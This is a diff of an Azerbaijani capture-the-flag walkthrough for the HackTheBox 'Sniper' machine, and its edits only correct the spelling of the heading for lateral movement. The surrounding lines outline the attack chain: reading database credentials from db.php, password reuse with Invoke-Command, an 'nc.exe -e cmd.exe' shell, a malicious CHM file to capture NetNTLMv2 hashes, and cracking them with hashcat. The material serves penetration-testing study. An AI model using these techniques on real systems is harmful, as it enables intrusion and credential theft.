@@ -20,7 +20,7 @@ Kəşfiyyat
 |-- whoami -> nt authority\iusr
 +-- type C:\inetpub\wwwroot\user\db.php -> dbuser:<PASSWORD>
 
-Ufuqi Yerdəyişmə
+Üfüqi Yerdəyişmə
 |-- Invoke-Command LOCALHOST as SNIPER\chris (password reuse)
 |-- nc.exe -e cmd.exe -> shell as sniper\chris
 +-- user.txt
@@ -148,7 +148,7 @@ $con = mysqli_connect("localhost","dbuser","<PASSWORD>","sniper");
 
 ---
 
-## Ufuqi Yerdəyişmə
+## Üfüqi Yerdəyişmə
 
 ### chris İstifadəçisinə Şifrə Təkrarı
 
@@ -361,4 +361,4 @@ C:\Users\Administrator\Documents>type C:\Users\Administrator\Desktop\root.txt
 - Veb tətbiqinin mənbəyində tapılan giriş məlumatları (`db.php`) tez-tez lokal hesab şifrələri ilə təkrar istifadə olunur. DB istifadəçisinin şifrəsini lokal istifadəçilərə qarşı sına.
 - Sızmış qeyd və ya README müştəri tərəfində icra yolunu (CHM, LNK, Office) göstərə bilər. Sənəd qovluğu yazıla biləndirsə, UNC istinadlı zərərli CHM NetNTLMv2 ələ keçirir.
 - NetNTLMv2 (`hashcat -m 5600`) zəif şifrə ilə rockyou-dan istifadə edərək tez sındırılır. Sındırdıqdan sonra `PSCredential` ilə `Invoke-Command` WinRM açıq olmadan shell verir.
-- Hər mərhələnin ekran görüntüsünü götür: `whoami` ilkin girişdən sonra, ufuqi yerdəyişmədən sonra və səlahiyyətlərin artırılmasından sonra - hər OSCP markerinə bir.
+- Hər mərhələnin ekran görüntüsünü götür: `whoami` ilkin girişdən sonra, üfüqi yerdəyişmədən sonra və səlahiyyətlərin artırılmasından sonra - hər OSCP markerinə bir.
